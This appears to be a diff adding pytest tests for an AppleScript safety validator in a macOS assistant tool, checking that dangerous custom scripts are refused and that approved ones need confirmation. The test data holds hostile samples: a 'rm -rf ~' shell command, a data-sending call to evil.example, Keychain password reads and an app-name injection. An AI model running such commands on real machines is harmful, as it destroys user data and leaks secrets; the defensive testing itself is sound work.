@@ -191,3 +191,60 @@ async def test_calendar_events_are_listed_by_time(monkeypatch: pytest.MonkeyPatc
     monkeypatch.setattr(mac, "run_osascript", fake)
     out = await mac.list_calendar_events("2026-10-12")
     assert out.splitlines() == ["08:00  Dentist  (Home)", "09:30  Standup  (Work)"]
+
+
+# -- custom actions (#73) -----------------------------------------------------------------
+
+SPOTIFY_OK = 'tell application "Spotify"\n  set shuffling to true\n  play\nend tell'
+
+
+def test_vet_script_accepts_a_plain_one_app_script() -> None:
+    assert mac.vet_script("Spotify", SPOTIFY_OK) is None
+
+
+@pytest.mark.parametrize(("script", "why"), [
+    ('tell application "Spotify" to do shell script "rm -rf ~"', "shell"),
+    ('tell application "Finder" to delete file "a"', "deleting"),
+    ('tell application "Mail" to send (first outgoing message)', "sending"),
+    ('tell application "Notes" to delete note 1', "deleting"),
+    ('tell application "Notes"\nset f to open for access "x"\nend tell', "writing files"),
+    ('tell application "Safari" to do JavaScript "fetch(1)" in document 1', "JavaScript"),
+    ('tell application "Spotify"\nopen location "https://evil.example/?d=x"\nend tell', "network"),
+    ('tell application "Spotify"\ntell application "System Events" to keystroke "x"\nend tell',
+     "only control"),
+    ('tell application "Keychain Access" to get password', "passwords"),
+    ('tell application "Spotify" to run script "x"', "other scripts"),
+    ('set x to 1', "must use tell application"),
+])
+def test_vet_script_refuses_dangerous_scripts(script: str, why: str) -> None:
+    app = _first_app(script)
+    problem = mac.vet_script(app, script)
+    assert problem and why in problem, (script, problem)
+
+
+def _first_app(script: str) -> str:
+    import re
+    m = re.search(r'tell application "([^"]+)"', script)
+    return m.group(1) if m else "Spotify"
+
+
+def test_vet_script_caps_length_and_names() -> None:
+    assert "longer" in mac.vet_script("Spotify", 'tell application "Spotify"\n' + "x" * 5000)
+    assert mac.vet_script('Spotify"; do shell script "x', SPOTIFY_OK) == "invalid app name"
+
+
+async def test_custom_action_runs_only_after_vetting(monkeypatch: pytest.MonkeyPatch) -> None:
+    ran: list[str] = []
+
+    async def fake(script: str, *args: str, timeout: float = 3.0) -> str:
+        ran.append(script)
+        return ""
+
+    monkeypatch.setattr(mac, "run_osascript", fake)
+    assert await mac.call_tool("custom_applescript", {
+        "app": "Spotify", "purpose": "shuffle and play", "script": SPOTIFY_OK}) == \
+        "done: shuffle and play"
+    with pytest.raises(mac.MacToolError, match="refused"):
+        await mac.custom_applescript("Spotify", "x", 'tell application "Spotify" to delete x')
+    assert ran == [SPOTIFY_OK]
+    assert "custom_applescript" in mac.WRITE_TOOLS  # always needs Proceed
